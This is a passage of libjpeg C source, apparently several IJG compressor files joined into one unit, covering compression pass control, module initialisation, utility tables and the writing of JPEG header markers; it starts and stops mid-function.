prepare_for_pass (j_compress_ptr cinfo)
{
  my_master_ptr master = (my_master_ptr) cinfo->master;

  switch (master->pass_type) {
  case main_pass:
    /* Initial pass: will collect input data, and do either Huffman
     * optimization or data output for the first scan.
     */
    select_scan_parameters(cinfo);
    per_scan_setup(cinfo);
    if (! cinfo->raw_data_in) {
      (*cinfo->cconvert->start_pass) (cinfo);
      (*cinfo->downsample->start_pass) (cinfo);
      (*cinfo->prep->start_pass) (cinfo, JBUF_PASS_THRU);
    }
    (*cinfo->fdct->start_pass) (cinfo);
    (*cinfo->entropy->start_pass) (cinfo, cinfo->optimize_coding);
    (*cinfo->coef->start_pass) (cinfo,
				(master->total_passes > 1 ?
				 JBUF_SAVE_AND_PASS : JBUF_PASS_THRU));
    (*cinfo->main->start_pass) (cinfo, JBUF_PASS_THRU);
    if (cinfo->optimize_coding) {
      /* No immediate data output; postpone writing frame/scan headers */
      master->pub.call_pass_startup = FALSE;
    } else {
      /* Will write frame/scan headers at first jpeg_write_scanlines call */
      master->pub.call_pass_startup = TRUE;
    }
    break;
#ifdef ENTROPY_OPT_SUPPORTED
  case huff_opt_pass:
    /* Do Huffman optimization for a scan after the first one. */
    select_scan_parameters(cinfo);
    per_scan_setup(cinfo);
    if (cinfo->Ss != 0 || cinfo->Ah == 0 || cinfo->arith_code) {
      (*cinfo->entropy->start_pass) (cinfo, TRUE);
      (*cinfo->coef->start_pass) (cinfo, JBUF_CRANK_DEST);
      master->pub.call_pass_startup = FALSE;
      break;
    }
    /* Special case: Huffman DC refinement scans need no Huffman table
     * and therefore we can skip the optimization pass for them.
     */
    master->pass_type = output_pass;
    master->pass_number++;
    /*FALLTHROUGH*/
#endif
  case output_pass:
    /* Do a data-output pass. */
    /* We need not repeat per-scan setup if prior optimization pass did it. */
    if (! cinfo->optimize_coding) {
      select_scan_parameters(cinfo);
      per_scan_setup(cinfo);
    }
    (*cinfo->entropy->start_pass) (cinfo, FALSE);
    (*cinfo->coef->start_pass) (cinfo, JBUF_CRANK_DEST);
    /* We emit frame/scan headers now */
    if (master->scan_number == 0)
      (*cinfo->marker->write_frame_header) (cinfo);
    (*cinfo->marker->write_scan_header) (cinfo);
    master->pub.call_pass_startup = FALSE;
    break;
  default:
    ERREXIT(cinfo, JERR_NOT_COMPILED);
  }

  master->pub.is_last_pass = (master->pass_number == master->total_passes-1);

  /* Set up progress monitor's pass info if present */
  if (cinfo->progress != NULL) {
    cinfo->progress->completed_passes = master->pass_number;
    cinfo->progress->total_passes = master->total_passes;
  }
}


/*
 * Special start-of-pass hook.
 * This is called by jpeg_write_scanlines if call_pass_startup is TRUE.
 * In single-pass processing, we need this hook because we don't want to
 * write frame/scan headers during jpeg_start_compress; we want to let the
 * application write COM markers etc. between jpeg_start_compress and the
 * jpeg_write_scanlines loop.
 * In multi-pass processing, this routine is not used.
 */

METHODDEF(void)
pass_startup (j_compress_ptr cinfo)
{
  cinfo->master->call_pass_startup = FALSE; /* reset flag so call only once */

  (*cinfo->marker->write_frame_header) (cinfo);
  (*cinfo->marker->write_scan_header) (cinfo);
}


/*
 * Finish up at end of pass.
 */

METHODDEF(void)
finish_pass_master (j_compress_ptr cinfo)
{
  my_master_ptr master = (my_master_ptr) cinfo->master;

  /* The entropy coder always needs an end-of-pass call,
   * either to analyze statistics or to flush its output buffer.
   */
  (*cinfo->entropy->finish_pass) (cinfo);

  /* Update state for next pass */
  switch (master->pass_type) {
  case main_pass:
    /* next pass is either output of scan 0 (after optimization)
     * or output of scan 1 (if no optimization).
     */
    master->pass_type = output_pass;
    if (! cinfo->optimize_coding)
      master->scan_number++;
    break;
  case huff_opt_pass:
    /* next pass is always output of current scan */
    master->pass_type = output_pass;
    break;
  case output_pass:
    /* next pass is either optimization or output of next scan */
    if (cinfo->optimize_coding)
      master->pass_type = huff_opt_pass;
    master->scan_number++;
    break;
  }

  master->pass_number++;
}


/*
 * Initialize master compression control.
 */

GLOBAL(void)
jinit_c_master_control (j_compress_ptr cinfo, boolean transcode_only)
{
  my_master_ptr master;

  master = (my_master_ptr)
      (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
				  SIZEOF(my_comp_master));
  cinfo->master = (struct jpeg_comp_master *) master;
  master->pub.prepare_for_pass = prepare_for_pass;
  master->pub.pass_startup = pass_startup;
  master->pub.finish_pass = finish_pass_master;
  master->pub.is_last_pass = FALSE;

  /* Validate parameters, determine derived values */
  initial_setup(cinfo);

  if (cinfo->scan_info != NULL) {
#ifdef C_MULTISCAN_FILES_SUPPORTED
    validate_script(cinfo);
#else
    ERREXIT(cinfo, JERR_NOT_COMPILED);
#endif
  } else {
    cinfo->progressive_mode = FALSE;
    cinfo->num_scans = 1;
  }

  if (cinfo->progressive_mode)	/*  TEMPORARY HACK ??? */
    cinfo->optimize_coding = TRUE; /* assume default tables no good for progressive mode */

  /* Initialize my private state */
  if (transcode_only) {
    /* no main pass in transcoding */
    if (cinfo->optimize_coding)
      master->pass_type = huff_opt_pass;
    else
      master->pass_type = output_pass;
  } else {
    /* for normal compression, first pass is always this type: */
    master->pass_type = main_pass;
  }
  master->scan_number = 0;
  master->pass_number = 0;
  if (cinfo->optimize_coding)
    master->total_passes = cinfo->num_scans * 2;
  else
    master->total_passes = cinfo->num_scans;
}
/*
 * jcinit.c
 *
 * Copyright (C) 1991-1997, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains initialization logic for the JPEG compressor.
 * This routine is in charge of selecting the modules to be executed and
 * making an initialization call to each one.
 *
 * Logically, this code belongs in jcmaster.c.  It's split out because
 * linking this routine implies linking the entire compression library.
 * For a transcoding-only application, we want to be able to use jcmaster.c
 * without linking in the whole library.
 */


/*
 * Master selection of compression modules.
 * This is done once at the start of processing an image.  We determine
 * which modules will be used and give them appropriate initialization calls.
 */

GLOBAL(void)
jinit_compress_master (j_compress_ptr cinfo)
{
  /* Initialize master control (includes parameter checking/processing) */
  jinit_c_master_control(cinfo, FALSE /* full compression */);

  /* Preprocessing */
  if (! cinfo->raw_data_in) {
    jinit_color_converter(cinfo);
    jinit_downsampler(cinfo);
    jinit_c_prep_controller(cinfo, FALSE /* never need full buffer here */);
  }
  /* Forward DCT */
  jinit_forward_dct(cinfo);
  /* Entropy encoding: either Huffman or arithmetic coding. */
  if (cinfo->arith_code) {
    ERREXIT(cinfo, JERR_ARITH_NOTIMPL);
  } else {
    if (cinfo->progressive_mode) {
#ifdef C_PROGRESSIVE_SUPPORTED
      jinit_phuff_encoder(cinfo);
#else
      ERREXIT(cinfo, JERR_NOT_COMPILED);
#endif
    } else
      jinit_huff_encoder(cinfo);
  }

  /* Need a full-image coefficient buffer in any multi-pass mode. */
  jinit_c_coef_controller(cinfo,
		(boolean) (cinfo->num_scans > 1 || cinfo->optimize_coding));
  jinit_c_main_controller(cinfo, FALSE /* never need full buffer here */);

  jinit_marker_writer(cinfo);

  /* We can now tell the memory manager to allocate virtual arrays. */
  (*cinfo->mem->realize_virt_arrays) ((j_common_ptr) cinfo);

  /* Write the datastream header (SOI) immediately.
   * Frame and scan headers are postponed till later.
   * This lets application insert special markers after the SOI.
   */
  (*cinfo->marker->write_file_header) (cinfo);
}
/*
 * jutils.c
 *
 * Copyright (C) 1991-1996, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains tables and miscellaneous utility routines needed
 * for both compression and decompression.
 * Note we prefix all global names with "j" to minimize conflicts with
 * a surrounding application.
 */


/*
 * jpeg_zigzag_order[i] is the zigzag-order position of the i'th element
 * of a DCT block read in natural order (left to right, top to bottom).
 */

#if 0				/* This table is not actually needed in v6a */

const int jpeg_zigzag_order[DCTSIZE2] = {
   0,  1,  5,  6, 14, 15, 27, 28,
   2,  4,  7, 13, 16, 26, 29, 42,
   3,  8, 12, 17, 25, 30, 41, 43,
   9, 11, 18, 24, 31, 40, 44, 53,
  10, 19, 23, 32, 39, 45, 52, 54,
  20, 22, 33, 38, 46, 51, 55, 60,
  21, 34, 37, 47, 50, 56, 59, 61,
  35, 36, 48, 49, 57, 58, 62, 63
};

#endif

/*
 * jpeg_natural_order[i] is the natural-order position of the i'th element
 * of zigzag order.
 *
 * When reading corrupted data, the Huffman decoders could attempt
 * to reference an entry beyond the end of this array (if the decoded
 * zero run length reaches past the end of the block).  To prevent
 * wild stores without adding an inner-loop test, we put some extra
 * "63"s after the real entries.  This will cause the extra coefficient
 * to be stored in location 63 of the block, not somewhere random.
 * The worst case would be a run-length of 15, which means we need 16
 * fake entries.
 */

const int jpeg_natural_order[DCTSIZE2+16] = {
  0,  1,  8, 16,  9,  2,  3, 10,
 17, 24, 32, 25, 18, 11,  4,  5,
 12, 19, 26, 33, 40, 48, 41, 34,
 27, 20, 13,  6,  7, 14, 21, 28,
 35, 42, 49, 56, 57, 50, 43, 36,
 29, 22, 15, 23, 30, 37, 44, 51,
 58, 59, 52, 45, 38, 31, 39, 46,
 53, 60, 61, 54, 47, 55, 62, 63,
 63, 63, 63, 63, 63, 63, 63, 63, /* extra entries for safety in decoder */
 63, 63, 63, 63, 63, 63, 63, 63
};


/*
 * Arithmetic utilities
 */

GLOBAL(long)
jdiv_round_up (long a, long b)
/* Compute a/b rounded up to next integer, ie, ceil(a/b) */
/* Assumes a >= 0, b > 0 */
{
  return (a + b - 1L) / b;
}


GLOBAL(long)
jround_up (long a, long b)
/* Compute a rounded up to next multiple of b, ie, ceil(a/b)*b */
/* Assumes a >= 0, b > 0 */
{
  a += b - 1L;
  return a - (a % b);
}


/* On normal machines we can apply MEMCOPY() and MEMZERO() to sample arrays
 * and coefficient-block arrays.  This won't work on 80x86 because the arrays
 * are FAR and we're assuming a small-pointer memory model.  However, some
 * DOS compilers provide far-pointer versions of memcpy() and memset() even
 * in the small-model libraries.  These will be used if USE_FMEM is defined.
 * Otherwise, the routines below do it the hard way.  (The performance cost
 * is not all that great, because these routines aren't very heavily used.)
 */

#ifndef NEED_FAR_POINTERS	/* normal case, same as regular macros */
#define FMEMCOPY(dest,src,size)	MEMCOPY(dest,src,size)
#define FMEMZERO(target,size)	MEMZERO(target,size)
#else				/* 80x86 case, define if we can */
#ifdef USE_FMEM
#define FMEMCOPY(dest,src,size)	_fmemcpy((void FAR *)(dest), (const void FAR *)(src), (size_t)(size))
#define FMEMZERO(target,size)	_fmemset((void FAR *)(target), 0, (size_t)(size))
#endif
#endif


GLOBAL(void)
jcopy_sample_rows (JSAMPARRAY input_array, int source_row,
		   JSAMPARRAY output_array, int dest_row,
		   int num_rows, JDIMENSION num_cols)
/* Copy some rows of samples from one place to another.
 * num_rows rows are copied from input_array[source_row++]
 * to output_array[dest_row++]; these areas may overlap for duplication.
 * The source and destination arrays must be at least as wide as num_cols.
 */
{
  JSAMPROW inptr, outptr;
#ifdef FMEMCOPY
  size_t count = (size_t) (num_cols * SIZEOF(JSAMPLE));
#else
  JDIMENSION count;
#endif
  int row;

  input_array += source_row;
  output_array += dest_row;

  for (row = num_rows; row > 0; row--) {
    inptr = *input_array++;
    outptr = *output_array++;
#ifdef FMEMCOPY
    FMEMCOPY(outptr, inptr, count);
#else
    for (count = num_cols; count > 0; count--)
      *outptr++ = *inptr++;	/* needn't bother with GETJSAMPLE() here */
#endif
  }
}


GLOBAL(void)
jcopy_block_row (JBLOCKROW input_row, JBLOCKROW output_row,
		 JDIMENSION num_blocks)
/* Copy a row of coefficient blocks from one place to another. */
{
#ifdef FMEMCOPY
  FMEMCOPY(output_row, input_row, num_blocks * (DCTSIZE2 * SIZEOF(JCOEF)));
#else
  JCOEFPTR inptr, outptr;
  long count;

  inptr = (JCOEFPTR) input_row;
  outptr = (JCOEFPTR) output_row;
  for (count = (long) num_blocks * DCTSIZE2; count > 0; count--) {
    *outptr++ = *inptr++;
  }
#endif
}


GLOBAL(void)
jzero_far (void FAR * target, size_t bytestozero)
/* Zero out a chunk of FAR memory. */
/* This might be sample-array data, block-array data, or alloc_large data. */
{
#ifdef FMEMZERO
  FMEMZERO(target, bytestozero);
#else
  char FAR * ptr = (char FAR *) target;
  size_t count;

  for (count = bytestozero; count > 0; count--) {
    *ptr++ = 0;
  }
#endif
}
/*
 * jcmarker.c
 *
 * Copyright (C) 1991-1998, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains routines to write JPEG datastream markers.
 */


typedef enum {			/* JPEG marker codes */
  M_SOF0  = 0xc0,
  M_SOF1  = 0xc1,
  M_SOF2  = 0xc2,
  M_SOF3  = 0xc3,
  
  M_SOF5  = 0xc5,
  M_SOF6  = 0xc6,
  M_SOF7  = 0xc7,
  
  M_JPG   = 0xc8,
  M_SOF9  = 0xc9,
  M_SOF10 = 0xca,
  M_SOF11 = 0xcb,
  
  M_SOF13 = 0xcd,
  M_SOF14 = 0xce,
  M_SOF15 = 0xcf,
  
  M_DHT   = 0xc4,
  
  M_DAC   = 0xcc,
  
  M_RST0  = 0xd0,
  M_RST1  = 0xd1,
  M_RST2  = 0xd2,
  M_RST3  = 0xd3,
  M_RST4  = 0xd4,
  M_RST5  = 0xd5,
  M_RST6  = 0xd6,
  M_RST7  = 0xd7,
  
  M_SOI   = 0xd8,
  M_EOI   = 0xd9,
  M_SOS   = 0xda,
  M_DQT   = 0xdb,
  M_DNL   = 0xdc,
  M_DRI   = 0xdd,
  M_DHP   = 0xde,
  M_EXP   = 0xdf,
  
  M_APP0  = 0xe0,
  M_APP1  = 0xe1,
  M_APP2  = 0xe2,
  M_APP3  = 0xe3,
  M_APP4  = 0xe4,
  M_APP5  = 0xe5,
  M_APP6  = 0xe6,
  M_APP7  = 0xe7,
  M_APP8  = 0xe8,
  M_APP9  = 0xe9,
  M_APP10 = 0xea,
  M_APP11 = 0xeb,
  M_APP12 = 0xec,
  M_APP13 = 0xed,
  M_APP14 = 0xee,
  M_APP15 = 0xef,
  
  M_JPG0  = 0xf0,
  M_JPG13 = 0xfd,
  M_COM   = 0xfe,
  
  M_TEM   = 0x01,
  
  M_ERROR = 0x100
} JPEG_MARKER;


/* Private state */

typedef struct {
  struct jpeg_marker_writer pub; /* public fields */

  unsigned int last_restart_interval; /* last DRI value emitted; 0 after SOI */
} my_marker_writer;

typedef my_marker_writer * my_marker_ptr;


/*
 * Basic output routines.
 *
 * Note that we do not support suspension while writing a marker.
 * Therefore, an application using suspension must ensure that there is
 * enough buffer space for the initial markers (typ. 600-700 bytes) before
 * calling jpeg_start_compress, and enough space to write the trailing EOI
 * (a few bytes) before calling jpeg_finish_compress.  Multipass compression
 * modes are not supported at all with suspension, so those two are the only
 * points where markers will be written.
 */

void emit_byte_marker (j_compress_ptr cinfo, int val)
/* Emit a byte */
{
  struct jpeg_destination_mgr * dest = cinfo->dest;

  *(dest->next_output_byte)++ = (JOCTET) val;
  if (--dest->free_in_buffer == 0) {
    if (! (*dest->empty_output_buffer) (cinfo))
      ERREXIT(cinfo, JERR_CANT_SUSPEND);
  }
}


LOCAL(void)
emit_marker (j_compress_ptr cinfo, JPEG_MARKER mark)
/* Emit a marker code */
{
  emit_byte_marker(cinfo, 0xFF);
  emit_byte_marker(cinfo, (int) mark);
}


LOCAL(void)
emit_2bytes (j_compress_ptr cinfo, int value)
/* Emit a 2-byte integer; these are always MSB first in JPEG files */
{
  emit_byte_marker(cinfo, (value >> 8) & 0xFF);
  emit_byte_marker(cinfo, value & 0xFF);
}


/*
 * Routines to write specific marker types.
 */

LOCAL(int)
emit_dqt (j_compress_ptr cinfo, int index)
/* Emit a DQT marker */
/* Returns the precision used (0 = 8bits, 1 = 16bits) for baseline checking */
{
  JQUANT_TBL * qtbl = cinfo->quant_tbl_ptrs[index];
  int prec;
  int i;

  if (qtbl == NULL)
    ERREXIT1(cinfo, JERR_NO_QUANT_TABLE, index);

  prec = 0;
  for (i = 0; i < DCTSIZE2; i++) {
    if (qtbl->quantval[i] > 255)
      prec = 1;
  }

  if (! qtbl->sent_table) {
    emit_marker(cinfo, M_DQT);

    emit_2bytes(cinfo, prec ? DCTSIZE2*2 + 1 + 2 : DCTSIZE2 + 1 + 2);

    emit_byte_marker(cinfo, index + (prec<<4));

    for (i = 0; i < DCTSIZE2; i++) {
      /* The table entries must be emitted in zigzag order. */
      unsigned int qval = qtbl->quantval[jpeg_natural_order[i]];
      if (prec)
	      emit_byte_marker(cinfo, (int) (qval >> 8));
      emit_byte_marker(cinfo, (int) (qval & 0xFF));
    }

    qtbl->sent_table = TRUE;
  }

  return prec;
}


LOCAL(void)
emit_dht (j_compress_ptr cinfo, int index, boolean is_ac)
/* Emit a DHT marker */
{
  JHUFF_TBL * htbl;
  int length, i;
  
  if (is_ac) {
    htbl = cinfo->ac_huff_tbl_ptrs[index];
    index += 0x10;		/* output index has AC bit set */
  } else {
    htbl = cinfo->dc_huff_tbl_ptrs[index];
  }

  if (htbl == NULL)
    ERREXIT1(cinfo, JERR_NO_HUFF_TABLE, index);
  
  if (! htbl->sent_table) {
    emit_marker(cinfo, M_DHT);
    
    length = 0;
    for (i = 1; i <= 16; i++)
      length += htbl->bits[i];
    
    emit_2bytes(cinfo, length + 2 + 1 + 16);
    emit_byte_marker(cinfo, index);
    
    for (i = 1; i <= 16; i++)
      emit_byte_marker(cinfo, htbl->bits[i]);
    
    for (i = 0; i < length; i++)
      emit_byte_marker(cinfo, htbl->huffval[i]);
    
    htbl->sent_table = TRUE;
  }
}


LOCAL(void)
emit_dac (j_compress_ptr cinfo)
/* Emit a DAC marker */
/* Since the useful info is so small, we want to emit all the tables in */
/* one DAC marker.  Therefore this routine does its own scan of the table. */
{
#ifdef C_ARITH_CODING_SUPPORTED
  char dc_in_use[NUM_ARITH_TBLS];
  char ac_in_use[NUM_ARITH_TBLS];
  int length, i;
  jpeg_component_info *compptr;
  
  for (i = 0; i < NUM_ARITH_TBLS; i++)
    dc_in_use[i] = ac_in_use[i] = 0;
  
  for (i = 0; i < cinfo->comps_in_scan; i++) {
    compptr = cinfo->cur_comp_info[i];
    dc_in_use[compptr->dc_tbl_no] = 1;
    ac_in_use[compptr->ac_tbl_no] = 1;
  }
  
  length = 0;
  for (i = 0; i < NUM_ARITH_TBLS; i++)
    length += dc_in_use[i] + ac_in_use[i];
  
  emit_marker(cinfo, M_DAC);
  
  emit_2bytes(cinfo, length*2 + 2);
  
  for (i = 0; i < NUM_ARITH_TBLS; i++) {
    if (dc_in_use[i]) {
      emit_byte(cinfo, i);
      emit_byte(cinfo, cinfo->arith_dc_L[i] + (cinfo->arith_dc_U[i]<<4));
    }
    if (ac_in_use[i]) {
      emit_byte(cinfo, i + 0x10);
      emit_byte(cinfo, cinfo->arith_ac_K[i]);
    }
  }
#endif /* C_ARITH_CODING_SUPPORTED */
}


LOCAL(void)
emit_dri (j_compress_ptr cinfo)
/* Emit a DRI marker */
{
  emit_marker(cinfo, M_DRI);
  
  emit_2bytes(cinfo, 4);	/* fixed length */

  emit_2bytes(cinfo, (int) cinfo->restart_interval);
}


LOCAL(void)
emit_sof (j_compress_ptr cinfo, JPEG_MARKER code)
/* Emit a SOF marker */
{
  int ci;
  jpeg_component_info *compptr;
  
  emit_marker(cinfo, code);
  
  emit_2bytes(cinfo, 3 * cinfo->num_components + 2 + 5 + 1); /* length */

  /* Make sure image isn't bigger than SOF field can handle */
  if ((long) cinfo->image_height > 65535L ||
      (long) cinfo->image_width > 65535L)
    ERREXIT1(cinfo, JERR_IMAGE_TOO_BIG, (unsigned int) 65535);

  emit_byte_marker(cinfo, cinfo->data_precision);
  emit_2bytes(cinfo, (int) cinfo->image_height);
  emit_2bytes(cinfo, (int) cinfo->image_width);

  emit_byte_marker(cinfo, cinfo->num_components);

  for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;
       ci++, compptr++) {
    emit_byte_marker(cinfo, compptr->component_id);
    emit_byte_marker(cinfo, (compptr->h_samp_factor << 4) + compptr->v_samp_factor);
    emit_byte_marker(cinfo, compptr->quant_tbl_no);
  }
}


LOCAL(void)
emit_sos (j_compress_ptr cinfo)
/* Emit a SOS marker */
{
  int i, td, ta;
  jpeg_component_info *compptr;
  
  emit_marker(cinfo, M_SOS);
  
  emit_2bytes(cinfo, 2 * cinfo->comps_in_scan + 2 + 1 + 3); /* length */
  
  emit_byte_marker(cinfo, cinfo->comps_in_scan);
  
  for (i = 0; i < cinfo->comps_in_scan; i++) {
    compptr = cinfo->cur_comp_info[i];
    emit_byte_marker(cinfo, compptr->component_id);
    td = compptr->dc_tbl_no;
    ta = compptr->ac_tbl_no;
    if (cinfo->progressive_mode) {
      /* Progressive mode: only DC or only AC tables are used in one scan;
       * furthermore, Huffman coding of DC refinement uses no table at all.
       * We emit 0 for unused field(s); this is recommended by the P&M text
       * but does not seem to be specified in the standard.
       */
      if (cinfo->Ss == 0) {
	ta = 0;			/* DC scan */
	if (cinfo->Ah != 0 && !cinfo->arith_code)
	  td = 0;		/* no DC table either */
      } else {
	td = 0;			/* AC scan */
      }
    }
    emit_byte_marker(cinfo, (td << 4) + ta);
  }

  emit_byte_marker(cinfo, cinfo->Ss);
  emit_byte_marker(cinfo, cinfo->Se);
  emit_byte_marker(cinfo, (cinfo->Ah << 4) + cinfo->Al);
}


LOCAL(void)
emit_jfif_app0 (j_compress_ptr cinfo)
/* Emit a JFIF-compliant APP0 marker */
{
  /*
   * Length of APP0 block	(2 bytes)
   * Block ID			(4 bytes - ASCII "JFIF")
   * Zero byte			(1 byte to terminate the ID string)
   * Version Major, Minor	(2 bytes - major first)
   * Units			(1 byte - 0x00 = none, 0x01 = inch, 0x02 = cm)
   * Xdpu			(2 bytes - dots per unit horizontal)
   * Ydpu			(2 bytes - dots per unit vertical)
   * Thumbnail X size		(1 byte)
   * Thumbnail Y size		(1 byte)
   */
  
  emit_marker(cinfo, M_APP0);
  
  emit_2bytes(cinfo, 2 + 4 + 1 + 2 + 1 + 2 + 2 + 1 + 1); /* length */

  emit_byte_marker(cinfo, 0x4A);	/* Identifier: ASCII "JFIF" */
  emit_byte_marker(cinfo, 0x46);
  emit_byte_marker(cinfo, 0x49);
  emit_byte_marker(cinfo, 0x46);
  emit_byte_marker(cinfo, 0);
  emit_byte_marker(cinfo, cinfo->JFIF_major_version); /* Version fields */
  emit_byte_marker(cinfo, cinfo->JFIF_minor_version);
  emit_byte_marker(cinfo, cinfo->density_unit); /* Pixel size information */
  emit_2bytes(cinfo, (int) cinfo->X_density);
  emit_2bytes(cinfo, (int) cinfo->Y_density);
  emit_byte_marker(cinfo, 0);		/* No thumbnail image */
  emit_byte_marker(cinfo, 0);
}


LOCAL(void)
emit_adobe_app14 (j_compress_ptr cinfo)
/* Emit an Adobe APP14 marker */
{
  /*
   * Length of APP14 block	(2 bytes)
   * Block ID			(5 bytes - ASCII "Adobe")
   * Version Number		(2 bytes - currently 100)
   * Flags0			(2 bytes - currently 0)
   * Flags1			(2 bytes - currently 0)
   * Color transform		(1 byte)
   *
   * Although Adobe TN 5116 mentions Version = 101, all the Adobe files
   * now in circulation seem to use Version = 100, so that's what we write.
   *
   * We write the color transform byte as 1 if the JPEG color space is
   * YCbCr, 2 if it's YCCK, 0 otherwise.  Adobe's definition has to do with
   * whether the encoder performed a transformation, which is pretty useless.
   */
  
  emit_marker(cinfo, M_APP14);
  
  emit_2bytes(cinfo, 2 + 5 + 2 + 2 + 2 + 1); /* length */

  emit_byte_marker(cinfo, 0x41);	/* Identifier: ASCII "Adobe" */
  emit_byte_marker(cinfo, 0x64);
  emit_byte_marker(cinfo, 0x6F);
  emit_byte_marker(cinfo, 0x62);
  emit_byte_marker(cinfo, 0x65);
  emit_2bytes(cinfo, 100);	/* Version */
  emit_2bytes(cinfo, 0);	/* Flags0 */
  emit_2bytes(cinfo, 0);	/* Flags1 */
  switch (cinfo->jpeg_color_space) {
  case JCS_YCbCr:
    emit_byte_marker(cinfo, 1);	/* Color transform = 1 */
    break;
  case JCS_YCCK:
    emit_byte_marker(cinfo, 2);	/* Color transform = 2 */
    break;
  default:
    emit_byte_marker(cinfo, 0);	/* Color transform = 0 */
    break;
  }
}


/*
 * These routines allow writing an arbitrary marker with parameters.
 * The only intended use is to emit COM or APPn markers after calling
 * write_file_header and before calling write_frame_header.
 * Other uses are not guaranteed to produce desirable results.
 * Counting the parameter bytes properly is the caller's responsibility.
 */

METHODDEF(void)
write_marker_header (j_compress_ptr cinfo, int marker, unsigned int datalen)
/* Emit an arbitrary marker header */
{
  if (datalen > (unsigned int) 65533)		/* safety check */
    ERREXIT(cinfo, JERR_BAD_LENGTH);

  emit_marker(cinfo, (JPEG_MARKER) marker);

  emit_2bytes(cinfo, (int) (datalen + 2));	/* total length */
}

METHODDEF(void)
write_marker_byte (j_compress_ptr cinfo, int val)
/* Emit one byte of marker parameters following write_marker_header */
{
  emit_byte_marker(cinfo, val);
}


/*
 * Write datastream header.
 * This consists of an SOI and optional APPn markers.
 * We recommend use of the JFIF marker, but not the Adobe marker,
 * when using YCbCr or grayscale data.  The JFIF marker should NOT
 * be used for any other JPEG colorspace.  The Adobe marker is helpful
 * to distinguish RGB, CMYK, and YCCK colorspaces.
 * Note that an application can write additional header markers after
 * jpeg_start_compress returns.
 */

METHODDEF(void)
write_file_header (j_compress_ptr cinfo)
{
  my_marker_ptr marker = (my_marker_ptr) cinfo->marker;

  emit_marker(cinfo, M_SOI);	/* first the SOI */

  /* SOI is defined to reset restart interval to 0 */
  marker->last_restart_interval = 0;

  if (cinfo->write_JFIF_header)	/* next an optional JFIF APP0 */
    emit_jfif_app0(cinfo);
  if (cinfo->write_Adobe_marker) /* next an optional Adobe APP14 */
    emit_adobe_app14(cinfo);
}


/*
 * Write frame header.
 * This consists of DQT and SOFn markers.
 * Note that we do not emit the SOF until we have emitted the DQT(s).
 * This avoids compatibility problems with incorrect implementations that
 * try to error-check the quant table numbers as soon as they see the SOF.
 */

METHODDEF(void)
write_frame_header (j_compress_ptr cinfo)
{
  int ci, prec;
  boolean is_baseline;
  jpeg_component_info *compptr;
  
  /* Emit DQT for each quantization table.
   * Note that emit_dqt() suppresses any duplicate tables.
   */
  prec = 0;
  for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;
       ci++, compptr++) {
    prec += emit_dqt(cinfo, compptr->quant_tbl_no);
  }
  /* now prec is nonzero iff there are any 16-bit quant tables. */

  /* Check for a non-baseline specification.
   * Note we assume that Huffman table numbers won't be changed later.
   */
  if (cinfo->arith_code || cinfo->progressive_mode ||
      cinfo->data_precision != 8) {
    is_baseline = FALSE;
  } else {
    is_baseline = TRUE;
    for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;
	 ci++, compptr++) {
      if (compptr->dc_tbl_no > 1 || compptr->ac_tbl_no > 1)
	is_baseline = FALSE;
    }
    if (prec && is_baseline) {
      is_baseline = FALSE;
      /* If it's baseline except for quantizer size, warn the user */
      TRACEMS(cinfo, 0, JTRC_16BIT_TABLES);
    }
  }

  /* Emit the proper SOF marker */
  if (cinfo->arith_code) {
    emit_sof(cinfo, M_SOF9);	/* SOF code for arithmetic coding */
  } else {
    if (cinfo->progressive_mode)
      emit_sof(cinfo, M_SOF2);	/* SOF code for progressive Huffman */
    else if (is_baseline)
      emit_sof(cinfo, M_SOF0);	/* SOF code for baseline implementation */
    else
      emit_sof(cinfo, M_SOF1);	/* SOF code for non-baseline Huffman file */
  }
}


/*
 * Write scan header.
 * This consists of DHT or DAC markers, optional DRI, and SOS.
 * Compressed data will be written following the SOS.
 */

METHODDEF(void)
write_scan_header (j_compress_ptr cinfo)
{
  my_marker_ptr marker = (my_marker_ptr) cinfo->marker;
  int i;
  jpeg_component_info *compptr;

  if (cinfo->arith_code) {
    /* Emit arith conditioning info.  We may have some duplication
     * if the file has multiple scans, but it's so small it's hardly
     * worth worrying about.
     */
    emit_dac(cinfo);
  } else {
    /* Emit Huffman tables.
     * Note that emit_dht() suppresses any duplicate tables.
     */
    for (i = 0; i < cinfo->comps_in_scan; i++) {
      compptr = cinfo->cur_comp_info[i];
      if (cinfo->progressive_mode) {
	/* Progressive mode: only DC or only AC tables are used in one scan */
	if (cinfo->Ss == 0) {
	  if (cinfo->Ah == 0)	/* DC needs no table for refinement scan */
	    emit_dht(cinfo, compptr->dc_tbl_no, FALSE);
	} else {
	  emit_dht(cinfo, compptr->ac_tbl_no, TRUE);
	}
      } else {
	/* Sequential mode: need both DC and AC tables */
	emit_dht(cinfo, compptr->dc_tbl_no, FALSE);
	emit_dht(cinfo, compptr->ac_tbl_no, TRUE);
      }
    }
  }

  /* Emit DRI if required --- note that DRI value could change for each scan.
   * We avoid wasting space with unnecessary DRIs, however.
   */
  if (cinfo->restart_interval != marker->last_restart_interval) {
    emit_dri(cinfo);
    marker->last_restart_interval = cinfo->restart_interval;
  }

  emit_sos(cinfo);
}


/*
 * Write datastream trailer.
 */

METHODDEF(void)
write_file_trailer (j_compress_ptr cinfo)
{
  emit_marker(cinfo, M_EOI);
}


/*
 * Write an abbreviated table-specification datastream.
 * This consists of SOI, DQT and DHT tables, and EOI.
 * Any table that is defined and not marked sent_table = TRUE will be
 * emitted.  Note that all tables will be marked sent_table = TRUE at exit.
 */

METHODDEF(void)
write_tables_only (j_compress_ptr cinfo)
{
  int i;

  emit_marker(cinfo, M_SOI);

  for (i = 0; i < NUM_QUANT_TBLS; i++) {
    if (cinfo->quant_tbl_ptrs[i] != NULL)
      (void) emit_dqt(cinfo, i);
  }

  if (! cinfo->arith_code) {
    for (i = 0; i < NUM_HUFF_TBLS; i++) {
      if (cinfo->dc_huff_tbl_ptrs[i] != NULL)
	emit_dht(cinfo, i, FALSE);
      if (cinfo->ac_huff_tbl_ptrs[i] != NULL)
